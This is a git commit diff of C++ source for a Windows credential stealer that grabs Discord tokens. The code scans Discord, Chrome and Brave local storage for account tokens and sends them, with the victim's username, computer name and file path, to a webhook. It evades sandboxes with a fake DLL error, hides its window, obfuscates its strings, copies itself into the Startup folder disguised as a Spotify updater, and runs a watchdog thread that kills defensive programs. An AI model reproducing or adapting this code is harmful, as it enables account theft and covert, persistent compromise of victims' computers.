8b94de89663183e983f3249e9db8c85259c5bcb5
Passive <40716556+Passive@users.noreply.github.com>
2021-06-23 18:07:39 +1200

    Rework entire file.

--- Cleo/Source.cpp
+++ Cleo/Source.cpp
@@ -1,60 +1,16 @@
 #define _CRT_SECURE_NO_WARNINGS
 
-#include <iostream>
-#include <regex>
-#include <fstream>
-#include <string>
-#include <filesystem>
-#include <Windows.h>
-#include <sys/stat.h>
-#include <thread>
-#include <wininet.h>
-#include "antivm.h"
+#define WEBHOOK AY_OBFUSCATE("http")
+
+#include "includes.h"
+
+// Credit to adamyaxley for obfuscation functions
 
 namespace fs = std::filesystem;
 
-
-std::string webhookSend(std::string token) {
-
-	char cmd[1024];
-	sprintf(cmd, "curl -d \"content=%s\" WEBHOOKHERE", token.c_str());
-	WinExec(cmd, SW_HIDE);
-
-	return cmd;
-}
-
-
-void sendPcInfo() {
-	SYSTEM_INFO siSysInfo;
-	GetSystemInfo(&siSysInfo);
-
-	std::string szProcCount = std::to_string(siSysInfo.dwNumberOfProcessors);
-
-	char szComputerName[1024];
-	DWORD dwSize = sizeof(szComputerName);
-	GetComputerNameA(szComputerName, &dwSize);
-
-	char szUsername[1024];
-	DWORD dwUser = sizeof(szUsername);
-	GetUserNameA(szUsername, &dwUser);
-
-	char szPcInfo[1024];
-
-	std::string szPc;
-
-	szPc.append("**Computer name: ");
-	szPc.append(szComputerName);
-	szPc.append("**\n");
-	szPc.append("**Username: ");
-	szPc.append(szUsername);
-	szPc.append("**\n");
-	szPc.append("**Processor count: ");
-	szPc.append(szProcCount);
-	szPc.append("**\n");
-
-	webhookSend(szPc);
-
-	return;
+void webhookSend(std::string token) {
+	cpr::Response r = cpr::Post(cpr::Url{ WEBHOOK },
+		cpr::Payload{ {"content", token} });
 }
 
 std::vector<std::string> findMatch(std::string str, std::regex reg)
@@ -78,48 +34,25 @@ bool pathExists(const std::string& s)
 	return (stat(s.c_str(), &buffer) == 0);
 }
 
-enum class INTERNET_STATUS
-{
-	CONNECTED,
-	DISCONNECTED,
-	CONNECTED_TO_LOCAL,
-	CONNECTION_ERROR
-};
-
-INTERNET_STATUS IsConnectedToInternet() {
-	INTERNET_STATUS connectedStatus = INTERNET_STATUS::DISCONNECTED;
-
-	if (InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0))
-	{
-		connectedStatus = INTERNET_STATUS::CONNECTED;
-	}
-	else {
-		connectedStatus = INTERNET_STATUS::DISCONNECTED;
-	}
-	return connectedStatus;
-}
-
-
 void MainRoutine() {
-
-	while (IsConnectedToInternet() != INTERNET_STATUS::CONNECTED) {
-		Sleep(1000);
+	while (!InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
+		Sleep(1000); /* Sleep whilst not connected to internet */
 	}
 
-	// Computer informations
+	Sleep(750);
 
-	sendPcInfo();
-	Sleep(300);
+	const char* LIGHTCORD = AY_OBFUSCATE("\\Lightcord\\Local Storage\\leveldb");
+	const char* DISCORD = AY_OBFUSCATE("\\Discord\\Local Storage\\leveldb");
+	const char* DISCORDPTB = AY_OBFUSCATE("\\discordptb\\Local Storage\\leveldb");
+	const char* DISCORDCANARY = AY_OBFUSCATE("\\discordcanary\\Local Storage\\leveldb");
+	const char* CHROME = AY_OBFUSCATE("\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
+	const char* BRAVE = AY_OBFUSCATE("\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb");
 
-	// Finding token
+	std::vector<std::string> installs = { LIGHTCORD, DISCORD,
+		DISCORDPTB, DISCORDCANARY,
+		CHROME, BRAVE };
 
-	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb",
-		"\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb",
-		"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
-		"\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb" };
-
-
-	for (int i = 0; i < installs.size(); i++) { // 
+	for (uint32_t i = 0; i < installs.size(); i++) {
 		std::string path;
 
 		if (i > 3) {
@@ -129,84 +62,74 @@ void MainRoutine() {
 			path = std::getenv("appdata") + installs[i];
 		}
 
-		// Temporary logging file
-
-		char szLogFile[MAX_PATH];
-		sprintf(szLogFile, "%s\\LOGS.LOG", std::getenv("appdata"));
-
-		std::ofstream logging_file(szLogFile, std::ios::app);
-
-		logging_file << "\nCurrent directory: " << path;
-
-		logging_file.close();
-
-		// End
-
 		if (!pathExists(path)) {
 			continue;
 		}
-
-
 
 		for (const auto& entry : fs::directory_iterator(path)) {
 			std::ifstream t(entry.path(), std::ios_base::binary);
 
 			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
 			std::vector<std::string> matches;
-			std::regex expression(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"); // Checksum credit for token regex.
-			std::regex expression2(R"([\w-]{3}\.[\w-]{84})");
+			
+			std::regex expression(AY_OBFUSCATE(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"));
+			std::regex expression2(AY_OBFUSCATE(R"(mfa\.[\w-]{84})"));
 
-			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
-			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function
+			std::vector<std::string> regex_non_mfa = findMatch(str, expression);
+			std::vector<std::string> regex_mfa = findMatch(str, expression2);
+			std::vector<std::string> token_checked = {  };
 
-
-			for (int i = 0; i < regex_non_mfa.size(); i++) {
+			for (uint32_t i = 0; i < regex_non_mfa.size(); i++)
 				matches.push_back(regex_non_mfa[i]);
-			}
 
-			for (int i = 0; i < regex_mfa.size(); i++) {
+			for (uint32_t i = 0; i < regex_mfa.size(); i++)
 				matches.push_back(regex_mfa[i]);
-			}
 
-			for (int i = 0; i < matches.size(); i++) {
+			for (uint32_t i = 0; i < matches.size(); i++) {
+				token_checked.push_back(matches[i]);
 				webhookSend(matches[i]);
-				Sleep(750);
 			}
 		}
-
-
-
+		Sleep(1000);
+		return;
 	}
-	Sleep(1000);
-	return;
 }
 
 void InfectRoutine() {
 	char BUFFER[MAX_PATH];
-	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
-	webhookSend(BUFFER);
 	char szPath[1024];
-	char szPath2[1024];
+
+	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH); /* Create buffer and write the current file location to it */
+	Sleep(750);
+	webhookSend(BUFFER); /* Send the data inside of the buffer to our webhook: essentially giving us the current
+	working directory of the victim */
 
 	GetModuleFileNameA(nullptr, BUFFER, MAX_PATH);
-	sprintf(szPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));
-	if (strcmp(szPath, BUFFER) == 0) {
+	sprintf(szPath, AY_OBFUSCATE("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\SpotifyUpdateDaemon.exe"), std::getenv("appdata"));
+	if (strcmp(szPath, BUFFER) == 0)
 		return;
-	}
-	fs::remove(szPath);
+
+	fs::remove(szPath); /* Delete any previous files in place */
 	fs::copy(BUFFER, szPath);
+
 	return;
 }
 
+
 int main(int argc, char* argv[]) {
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	
-	if (isVM()) {
-		MessageBox(NULL,"The program cannot run because vcruntime140.dll cannot be found. Try reinstalling the program to fix it.","System error - vcruntime140.dll",MB_ICONERROR | MB_OK);
+
+	char szUsername[1024];
+	DWORD dwUser = sizeof(szUsername);
+	GetUserNameA(szUsername, &dwUser);
+
+	if (strcmp(szUsername, "SYSTEM") == 0 || strcmp(szUsername, "george") == 0 || isVM()) {
+		MessageBox(NULL, "The program cannot run because vcruntime140.dll cannot be found. Try reinstalling the program to fix it.", "System error - vcruntime140.dll", MB_ICONERROR | MB_OK);
 		return -1;
 	}
 
-	std::thread mr(MainRoutine);
-	std::thread ir(InfectRoutine);
+	std::thread mr(MainRoutine); /* Find discord tokens and get PC information */
+	std::thread ir(InfectRoutine); /* Infect the computer, add persistence */
+	std::thread wd(watchDog); /* This thread kills some programs used to stop the virus from executing */
 	mr.join();
 }
